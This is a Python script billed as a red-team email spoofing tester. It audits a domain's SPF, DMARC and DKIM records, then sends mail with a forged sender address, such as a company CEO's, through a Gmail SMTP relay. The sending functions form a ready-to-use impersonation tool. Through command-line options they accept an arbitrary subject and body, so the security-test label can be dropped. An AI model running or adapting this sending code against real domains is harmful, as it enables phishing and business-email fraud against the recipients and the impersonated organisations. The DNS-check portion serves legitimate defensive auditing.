#!/usr/bin/env python3
"""
Shadow Red Team — Email Spoofing Tester v3.0
Interactive Mode + Gmail Relay
For authorized penetration testing only.
"""

import smtplib
import dns.resolver
import sys
import argparse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

class C:
    GREEN  = '\033[92m'
    RED    = '\033[91m'
    YELLOW = '\033[93m'
    CYAN   = '\033[96m'
    MAGENTA= '\033[95m'
    BOLD   = '\033[1m'
    RESET  = '\033[0m'

def banner():
    print(f"""
{C.RED}{C.BOLD}
 ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗
 ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║
 ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║
 ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║
 ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝
{C.RESET}
{C.CYAN}  Email Spoofing Tester v3.0 — Shadow Red Team{C.RESET}
{C.YELLOW}  ⚠️  Authorized penetration testing only{C.RESET}
""")

def separator():
    print(f"{C.BOLD}{'━'*55}{C.RESET}")

def check_domain(domain):
    separator()
    print(f"  🔍  DNS Check: {C.CYAN}{domain}{C.RESET}")
    separator()
    print()
    results = {"spf": None, "dmarc": None, "dkim": None}

    # SPF
    try:
        answers = dns.resolver.resolve(domain, 'TXT')
        spf_found = False
        for r in answers:
            txt = r.to_text().strip('"')
            if 'v=spf1' in txt:
                spf_found = True
                if '-all' in txt:
                    print(f"  {C.GREEN}✅  SPF: STRICT (-all){C.RESET}")
                    results["spf"] = "strict"
                elif '~all' in txt:
                    print(f"  {C.YELLOW}⚠️   SPF: SOFT (~all){C.RESET}")
                    results["spf"] = "soft"
                else:
                    print(f"  {C.RED}🔴  SPF: WEAK — VULNERABLE!{C.RESET}")
                    results["spf"] = "weak"
        if not spf_found:
            print(f"  {C.RED}🔴  SPF: MISSING — VULNERABLE!{C.RESET}")
            results["spf"] = "missing"
    except:
        print(f"  {C.RED}🔴  SPF: MISSING — VULNERABLE!{C.RESET}")
        results["spf"] = "missing"

    # DMARC
    try:
        answers = dns.resolver.resolve(f"_dmarc.{domain}", 'TXT')
        for r in answers:
            txt = r.to_text().strip('"')
            if 'v=DMARC1' in txt:
                if 'p=reject' in txt:
                    print(f"  {C.GREEN}✅  DMARC: REJECT{C.RESET}")
                    results["dmarc"] = "reject"
                elif 'p=quarantine' in txt:
                    print(f"  {C.YELLOW}⚠️   DMARC: QUARANTINE{C.RESET}")
                    results["dmarc"] = "quarantine"
                elif 'p=none' in txt:
                    print(f"  {C.RED}🔴  DMARC: p=none — VULNERABLE!{C.RESET}")
                    results["dmarc"] = "none"
    except:
        print(f"  {C.RED}🔴  DMARC: MISSING — VULNERABLE!{C.RESET}")
        results["dmarc"] = "missing"

    # DKIM
    selectors = ["default","google","mail","smtp","k1","selector1","selector2","dkim"]
    dkim_found = False
    for sel in selectors:
        try:
            dns.resolver.resolve(f"{sel}._domainkey.{domain}", 'TXT')
            print(f"  {C.YELLOW}⚠️   DKIM: selector '{sel}' found{C.RESET}")
            dkim_found = True
            results["dkim"] = sel
            break
        except:
            pass
    if not dkim_found:
        print(f"  {C.RED}🔴  DKIM: NOT CONFIGURED{C.RESET}")
        results["dkim"] = "missing"

    vulnerable = results["spf"] in ["missing","weak"] or results["dmarc"] in ["missing","none"]
    print(f"\n  {'🚨 DOMAIN IS VULNERABLE TO EMAIL SPOOFING!' if vulnerable else '🛡️  Domain is protected'}")
    return results, vulnerable


def interactive_mode(relay_user, relay_pass):
    separator()
    print(f"  📬  Interactive Spoof Mode")
    separator()
    print()

    # 1. Spoofed email address
    print(f"{C.CYAN}  [1] Spoofed sender email (e.g. ceo@d17.tn){C.RESET}")
    from_addr = input(f"  {C.BOLD}From >{C.RESET} ").strip()
    if not from_addr or '@' not in from_addr:
        print(f"  {C.RED}❌ Invalid email{C.RESET}")
        sys.exit(1)

    # Extract domain from spoofed email
    domain = from_addr.split('@')[1]

    # 2. Recipient email
    print(f"\n{C.CYAN}  [2] Recipient Gmail address{C.RESET}")
    to_addr = input(f"  {C.BOLD}To   >{C.RESET} ").strip()
    if not to_addr or '@' not in to_addr:
        print(f"  {C.RED}❌ Invalid email{C.RESET}")
        sys.exit(1)

    # 3. Custom message
    print(f"\n{C.CYAN}  [3] Your message (press Enter twice to finish){C.RESET}")
    print(f"  {C.BOLD}Message >{C.RESET}")
    lines = []
    while True:
        line = input("  ")
        if line == "" and lines and lines[-1] == "":
            break
        lines.append(line)
    custom_message = "\n".join(lines).strip()

    if not custom_message:
        custom_message = f"This is a security test email from Shadow Red Team.\nDomain {domain} is vulnerable to email spoofing."

    # Build email body
    body = f"""{custom_message}


---
⚠️  PENETRATION TEST — AUTHORIZED ASSESSMENT
Domain: {domain}
Date:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Tool:   Shadow Red Team v3.0
"""

    subject = f"[SECURITY TEST] Email Spoofing PoC — {domain}"

    print(f"\n{C.YELLOW}  📋 Summary:{C.RESET}")
    print(f"     From    : {C.YELLOW}{from_addr}{C.RESET}")
    print(f"     To      : {C.YELLOW}{to_addr}{C.RESET}")
    print(f"     Domain  : {C.CYAN}{domain}{C.RESET}")
    print(f"     Message : {custom_message[:60]}...")
    print()

    confirm = input(f"  {C.BOLD}Send? (y/n) >{C.RESET} ").strip().lower()
    if confirm != 'y':
        print(f"  {C.YELLOW}Aborted.{C.RESET}")
        sys.exit(0)

    return from_addr, to_addr, domain, subject, body


def send_spoof_email(from_addr, to_addr, domain, subject, body, relay_user, relay_pass):
    separator()
    print(f"  📧  Sending Email")
    separator()
    print()

    msg = MIMEMultipart("alternative")
    msg["From"]    = from_addr
    msg["To"]      = to_addr
    msg["Subject"] = subject
    msg["X-Mailer"] = "Shadow-RedTeam/3.0"
    msg.attach(MIMEText(body, "plain"))

    try:
        print(f"  {C.CYAN}Connecting to Gmail SMTP...{C.RESET}")
        server = smtplib.SMTP("smtp.gmail.com", 587, timeout=15)
        server.ehlo()
        server.starttls()
        server.login(relay_user, relay_pass)
        server.sendmail(from_addr, [to_addr], msg.as_string())
        server.quit()
        print(f"  {C.GREEN}{C.BOLD}✅ Email sent successfully!{C.RESET}")
        print(f"  {C.CYAN}Check inbox: {to_addr}{C.RESET}")
        return True
    except smtplib.SMTPAuthenticationError:
        print(f"  {C.RED}❌ Gmail auth failed — check App Password{C.RESET}")
    except Exception as e:
        print(f"  {C.RED}❌ Error: {e}{C.RESET}")
    return False


def generate_report(domain, results, vulnerable, sent, from_addr, to_addr):
    import os
    os.makedirs("reports", exist_ok=True)
    ts = datetime.now().strftime('%Y%m%d_%H%M')
    fname = f"reports/spoof_{domain}_{ts}.md"
    with open(fname, 'w') as f:
        f.write(f"""# Email Spoofing Report — {domain}
**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M')}
**Tool:** Shadow Red Team v3.0

| Record | Status |
|--------|--------|
| SPF    | {results.get('spf','?')} |
| DMARC  | {results.get('dmarc','?')} |
| DKIM   | {results.get('dkim','?')} |

**Verdict:** {'🚨 VULNERABLE' if vulnerable else '✅ Protected'}
**PoC:** {'✅ Email sent from `' + str(from_addr) + '` to `' + str(to_addr) + '`' if sent else '❌ Not sent'}

*Shadow Red Team — Authorized Assessment*
""")
    print(f"\n  {C.GREEN}📄 Report saved: {fname}{C.RESET}")


def main():
    p = argparse.ArgumentParser(description='Shadow Email Spoofing Tester v3.0')
    p.add_argument('--domain',     help='Target domain (optional in interactive mode)')
    p.add_argument('--from',       dest='from_addr')
    p.add_argument('--to',         dest='to_addr')
    p.add_argument('--subject')
    p.add_argument('--message',    help='Custom message body')
    p.add_argument('--relay-user', required=True, help='Gmail address for relay')
    p.add_argument('--relay-pass', required=True, help='Gmail App Password')
    p.add_argument('--send',       action='store_true')
    args = p.parse_args()

    banner()

    # Interactive mode if no --from/--to provided
    if not args.from_addr or not args.to_addr:
        from_addr, to_addr, domain, subject, body = interactive_mode(args.relay_user, args.relay_pass)
    else:
        from_addr = args.from_addr
        to_addr   = args.to_addr
        domain    = args.domain or from_addr.split('@')[1]
        subject   = args.subject or f"[SECURITY TEST] Email Spoofing PoC — {domain}"
        body      = args.message or f"Security test from Shadow Red Team.\nDomain {domain} is vulnerable."

    # Always check DNS first
    results, vulnerable = check_domain(domain)

    # Send
    sent = False
    if args.send or (not args.from_addr):  # always send in interactive mode
        sent = send_spoof_email(from_addr, to_addr, domain, subject, body, args.relay_user, args.relay_pass)

    generate_report(domain, results, vulnerable, sent, from_addr, to_addr)
    print()

if __name__ == "__main__":
    main()
